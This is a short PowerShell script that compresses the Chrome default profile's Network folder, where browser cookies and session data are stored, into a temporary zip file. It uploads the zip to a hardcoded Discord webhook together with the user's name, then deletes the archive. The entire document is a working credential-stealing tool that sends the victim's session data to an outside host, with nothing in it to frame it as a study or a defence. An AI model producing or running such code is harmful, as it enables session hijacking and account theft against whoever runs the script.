# Define the folder path
$FolderPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network"

# Define the name of the zip file
$ZipFileName = "NetworkData.zip"
$ZipFilePath = "$env:TEMP\$ZipFileName"

# Compress the folder
Compress-Archive -Path $FolderPath -DestinationPath $ZipFilePath -Force

# Check if the zip file was created successfully
if (Test-Path $ZipFilePath) {
    # Function to upload the zip file to Discord
    function Upload-Discord {
        [CmdletBinding()]
        param (
            [parameter(Position=0, Mandatory=$True)]
            [string]$file,
            [parameter(Position=1, Mandatory=$False)]
            [string]$text 
        )

        $hookurl = "https://discord.com/api/webhooks/1296512231965593703/J2pJO0xKn1b4dGrYgRAgjRBbDQTug_armw3ak9DJCSTGjGCZavlBss9-R-MEwvW9Fqhi"

        $Body = @{
            'username' = $env:username
            'content' = $text
        }

        # Send the message
        if (-not ([string]::IsNullOrEmpty($text))) {
            Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)
        }

        # Upload the zip file
        if (-not ([string]::IsNullOrEmpty($file))) {
            $multipartForm = @{
                file1 = Get-Item -Path $file
            }
            Invoke-RestMethod -Uri $hookurl -Method Post -Form $multipartForm
        }
    }

    # Upload the zip file to Discord
    Upload-Discord -file $ZipFilePath -text "Here is the compressed Network folder."

    # Optionally, clean up the zip file after upload
    Remove-Item $ZipFilePath -Force -ErrorAction SilentlyContinue
} else {
    Write-Host "Failed to create zip file."
}
